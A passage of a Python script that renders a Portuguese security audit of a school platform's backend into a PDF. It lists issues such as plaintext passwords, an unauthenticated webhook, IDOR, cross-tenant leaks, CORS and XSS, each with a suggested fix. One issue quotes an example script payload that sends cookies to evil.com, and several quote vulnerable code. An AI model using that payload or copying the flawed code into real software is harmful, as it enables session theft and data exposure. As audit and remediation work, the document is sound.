- [ ] Servidor recusa iniciar se variáveis obrigatórias não estiverem definidas
- [ ] docker-compose usa referências a variáveis de ambiente
- [ ] Todas as chaves afetadas foram rotacionadas
'''
    },
    {
        'num': 2,
        'title': '[Segurança] Senhas de alunos armazenadas em texto plano (sem hash bcrypt)',
        'labels': 'security, critical',
        'body': '''## Descrição
As senhas de alunos são armazenadas diretamente como texto plano no banco de dados, sem hash bcrypt. Isso afeta três cenários:

1. **POST /admin/stomes** (L452): `password: 'INITIAL_SUMMONING_CODE_LOGIN'`
2. **POST /admin/stomes/batch** (L504): `password: 'SUMMONING_CODE'`
3. **POST /admin/stomes/:id/reset** (L549): `password: 'RESET_TO_SUMMONING_CODE'`

Enquanto isso, professores e arquitetos usam bcrypt corretamente.

## Evidência
```typescript
// backend/src/routes/admin.ts:452
password: 'INITIAL_SUMMONING_CODE_LOGIN', // Placeholder — NÃO hasheado!

// backend/src/routes/admin.ts:504
password: 'SUMMONING_CODE',

// backend/src/routes/admin.ts:549
password: 'RESET_TO_SUMMONING_CODE'
```

## Impacto
Se o banco de dados for comprometido (SQL injection, backup exposto, acesso indevido), todas as senhas de alunos ficam diretamente legíveis em texto plano. Isso afeta potencialmente milhares de contas.

## Sugestão de Correção
- Usar `await bcrypt.hash(password, 10)` para todas as senhas de alunos, igual já é feito para professores
- Nota: o fluxo de "primeiro acesso" do aluno usa código de invocação (não senha), mas o campo password continua sendo persistido — se persistir, hashear

## Critérios de Aceite
- [ ] Todas as senhas de alunos são hasheadas com bcrypt antes de persistir
- [ ] migração de dados existentes para hashear senhas em texto plano
'''
    },
    {
        'num': 3,
        'title': '[Segurança] Webhook de billing sem autenticação — qualquer pessoa pode alterar status de pagamento',
        'labels': 'security, critical',
        'body': '''## Descrição
O endpoint `POST /webhooks/billing/webhook` não possui nenhum mecanismo de autenticação ou verificação de assinatura. Qualquer pessoa na internet pode enviar um payload para alterar o status de qualquer instituição.

## Evidência
```typescript
// backend/src/routes/webhooks.ts:1-10
export const webhookRoutes: FastifyPluginAsync = async (fastify: FastifyInstance) => {
  // NENHUM hook de autenticação aqui!
  fastify.post<{ Body: { type: string, data: any } }>('/billing/webhook', async (request, reply) => {
    const { type, data } = request.body;
    const institutionId = data?.institutionId || data?.metadata?.institutionId;
    // ... processa sem validar autenticidade
  });
};
```

## Impacto
Um atacante pode:
- Enviar `type: 'invoice.paid'` para reativar qualquer instituição bloqueada
- Enviar `type: 'subscription.canceled'` para bloquear qualquer instituição ativa
- Alterar o status de pagamento de qualquer instituição, causando perda de receita ou service denial

## Sugestão de Correção
- Implementar verificação de assinatura HMAC do provider de pagamento (Stripe webhook signature, Asaas webhook token)
- Adicionar middleware de autenticação ou IP allowlist
- Validar o payload contra um schema esperado

## Critérios de Aceite
- [ ] Webhook valida assinatura HMAC/token do provider de pagamento
- [ ] Payload validado contra schema
- [ ] Logs de todas as tentativas de webhook
'''
    },
    {
        'num': 4,
        'title': '[Segurança] IDOR: reatribuição de alunos entre instituições via POST /admin/stomes',
        'labels': 'security, critical',
        'body': '''## Descrição
No endpoint `POST /admin/stomes`, quando a matrícula já existe no sistema, o código atualiza a turma, turno, `instituicao` e `institutionId` do aluno **sem verificar se o aluno pertence à mesma instituição do Arquiteto** que faz a requisição.

## Evidência
```typescript
// backend/src/routes/admin.ts:441-460
if (existingStudent) {
  const updatedStudent = await prisma.user.update({
    where: { id: existingStudent.id },
    data: {
      turmaId,
      turno,
      instituicao: request.user.instituicao,          // ⚠️ Sobrescreve sem checar!
      institutionId: request.user.institutionId || null // ⚠️ Sobrescreve sem checar!
    }
  });
}
```

## Impacto
Um Arquiteto da instituição A pode:
1. Cadastrar um aluno existente da instituição B usando sua matrícula
2. O sistema atualiza o aluno, transferindo-o para a instituição A
3. O aluno perde acesso à sua instituição original

O mesmo problema afeta o cadastro em lote (`POST /admin/stomes/batch`).

## Sugestão de Correção
- Verificar `existingStudent.instituicao === request.user.instituicao` antes de permitir a atualização
- Se pertencer a outra instituição, retornar 403 ou 409

## Critérios de Aceite
- [ ] Reatribuição de aluno existente verificada contra instituição do Arquiteto
- [ ] Cadastro em lote também valida posse
'''
    },
    {
        'num': 5,
        'title': '[Segurança] Vazamento de dados cross-tenant em bounty e professor (sem filtro de instituição)',
        'labels': 'security, high',
        'body': '''## Descrição
Dois endpoints retornam dados sem filtrar pela instituição do usuário autenticado:

1. **GET /bounty/active** (L123-135): Retorna TODOS os bugs reportados de TODAS as instituições
2. **GET /professor/stomes?unassigned=true** (L69-80): Retorna TODOS os alunos sem turma de TODAS as instituições

## Evidência
```typescript
// backend/src/routes/bounty.ts:123-135
fastify.get('/active', async (request, reply) => {
  const bugs = await prisma.bountyBug.findMany({
    include: { user: { select: { nome: true, matricula: true } } },
    orderBy: { createdAt: 'desc' }
    // ⚠️ Sem filtro de instituição!
  });
});

// backend/src/routes/professor.ts:69-80
if (unassigned === 'true') {
  where.turmaId = null;
  // ⚠️ Sem filtro de turmaDisciplinas!
}
```

## Impacto
- Um Arquiteto pode ver bugs reportados por alunos de outras instituições (nomes, matrículas, descrições)
- Um Professor pode ver a lista completa de alunos não atribuídos de todas as instituições

## Sugestão de Correção
- Adicionar `where: { instituicao: request.user.instituicao }` em GET /bounty/active (pelo menos para ARQUITETO/PROFESSOR)
- Para unassigned, filtrar por `turma: { instituicao: request.user.instituicao }` quando o usuário não é ADMIN

## Critérios de Aceite
- [ ] GET /bounty/active filtra por instituição (exceto para ADMIN)
- [ ] GET /professor/stomes com unassigned filtra por instituição
'''
    },
    {
        'num': 6,
        'title': '[Segurança] XSS via e-mail: input do usuário injetado em HTML sem sanitização',
        'labels': 'security, high',
        'body': '''## Descrição
O campo `description` do bug report é injetado diretamente no template HTML do e-mail com apenas `replace(/\\n/g, '<br/>')`, sem escape de caracteres HTML especiais.

## Evidência
```typescript
// backend/src/routes/bounty.ts:55
html: `
  <blockquote style="background: #f4f4f4; padding: 15px;">
    ${description.replace(/\\n/g, '<br/>')}
  </blockquote>
`
```

## Impacto
Um atacante pode injetar HTML/JavaScript no campo description que será renderizado no e-mail do desenvolvedor:
```
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```
Embora a gravidade dependa do cliente de e-mail do destinatário (a maioria bloqueia JS), o HTML injetado pode causar phishing visual, form injection, ou redirect via `<a>` tags.

## Sugestão de Correção
- Usar uma lib de sanitização como `DOMPurify` (backend) ou escape manual: `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&quot;`
- Alternativamente, usar `textContent` equivalent no template

## Critérios de Aceite
- [ ] Input do usuário é sanitizado antes de inserir no HTML do e-mail
- [ ] Testes verificam que HTML/JS não passa no campo description
'''
    },
    {
        'num': 7,
        'title': '[Segurança] Matriz de auditoria acessível cross-tenant via query params institutionId/instituicao',
        'labels': 'security, high',
        'body': '''## Descrição
O endpoint `GET /admin/matrix/audit` aceita os parâmetros `institutionId` e `instituicao` na query string, permitindo que um Arquiteto especifique manualmente a instituição a consultar. O hook `validateInstitution` NÃO valida esses parâmetros — ele apenas valida `turmaId`, `disciplinaId` e `targetUserId`.

## Evidência
```typescript
// backend/src/routes/admin.ts:~L895
fastify.get('/matrix/audit', async (request, reply) => {
  const { institutionId, instituicao: targetInstName, ... } = request.query;
  // institutionId e instituicao vêm direto da query string!
  // validateInstitution não os valida.
});
```

## Impacto
Um Arquiteto da instituição A pode passar `?institutionId=<ID_da_instituicao_B>` e ver dados completos de auditoria (questões, entregas, taxas de acerto, logs) da instituição B.

## Sugestão de Correção
- Remover os parâmetros `institutionId` e `instituicao` da query string para usuários não-ADMIN
- OU: forçar que o `targetInst` seja sempre a instituição do usuário autenticado (exceto para ADMIN)

## Critérios de Aceite
- [ ] Parâmetros de instituição na query string são ignorados para ARQUITETO
- [ ] Apenas ADMIN pode consultar dados de outra instituição
'''
    },
    {
        'num': 8,
        'title': '[Segurança] CORS permissivo (origin: *) e token JWT via query string',
        'labels': 'security, medium',
        'body': '''## Descrição
Duas configurações de autenticação/segurança abaixo do ideal:

1. **CORS com `origin: '*'`** em `backend/src/server.ts:14-17`
2. **Token JWT aceito via query string** `?token=...` em `backend/src/plugins/auth.ts:12-15`

## Evidência
```typescript
// backend/src/server.ts:14-17
server.register(cors, {
  origin: '*',  // ⚠️ Qualquer origem
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
});

// backend/src/plugins/auth.ts:12-15
const queryToken = (request.query as any)?.token;
if (queryToken && !request.headers.authorization) {
  request.headers.authorization = `Bearer ${queryToken}`;
}
```

## Impacto
- CORS permissivo facilita ataques cross-origin e phishing
- Token em URL aparece em logs do servidor, histórico do navegador e cabeçalhos Referer

## Sugestão de Correção
- Restringir `origin` para os domínios do frontend (ou usar variável de ambiente)
- Remover suporte a token via query string em produção

## Critérios de Aceite
- [ ] CORS restrito a origens conhecidas
- [ ] Token via query string removido ou desabilitado em produção
'''
    },
]

for issue in issues:
    block = f'--- ISSUE {issue["num"]} ---\n\n'
    block += f'### [Segurança] {issue["title"].replace("[Segurança] ", "")}\n\n'
    block += f'**Labels:** {issue["labels"]}\n\n'
    block += issue['body']
    block += f'\n--- FIM ISSUE {issue["num"]} ---\n'
    escaped = html_mod.escape(block).replace('\n', '<br/>')
    story.append(Paragraph(escaped, sIssue))
    story.append(Spacer(1, 3*mm))

# ── Build PDF ──
doc.build(story, onFirstPage=header_footer, onLaterPages=header_footer)
print(f'✅ PDF gerado: {output_path}')
print(f'   Páginas: consulte o arquivo')
